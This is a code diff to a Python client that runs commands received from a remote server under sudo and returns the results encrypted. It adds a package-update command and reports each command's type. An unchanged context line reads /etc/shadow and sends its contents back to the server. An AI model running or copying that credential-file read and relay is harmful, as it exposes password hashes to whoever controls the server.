@@ -32,6 +32,10 @@ class client_class():
         command_id=command_array[1:5]
         command_name=command_array[5:9]
         match command_name:
+            case b'updt':
+                update_command='sudo dnf update'
+                self.exec.run(bytes(command_id), update_command)
+                clogger.info(f'Started exec updt')
             case b'usrs':
                 retrieve_command='sudo cat /etc/shadow'
                 result=self.exec.run_and_wait(bytes(command_id), retrieve_command)
@@ -262,11 +266,15 @@ class client_class():
                         ids_to_delete=[]
                         for id in completed_commands.keys():
                             try:
+                                cmd_type=self.exec.type_ids[id]
+                            except:
+                                cmd_type=b'exec'
+                            try:
                                 result=json.dumps({time.time():completed_commands[id]})
                             except Exception as E:
                                 clogger.error(f'ERR {E} jsoning result')
                                 result=[f'ERR {E} jsoning result']
-                            bytes_to_send=bytearray(b'2')+bytearray(id)+bytearray(b'exec')+bytearray(result, encoding="utf-8")
+                            bytes_to_send=bytearray(b'2')+bytearray(id)+bytearray(cmd_type)+bytearray(result, encoding="utf-8")
                             clogger.info(f'Sending result of exec {id} {result}')
                             await self.send_encrypted(bytes_to_send)
                             clogger.info(f'result of exec sent')
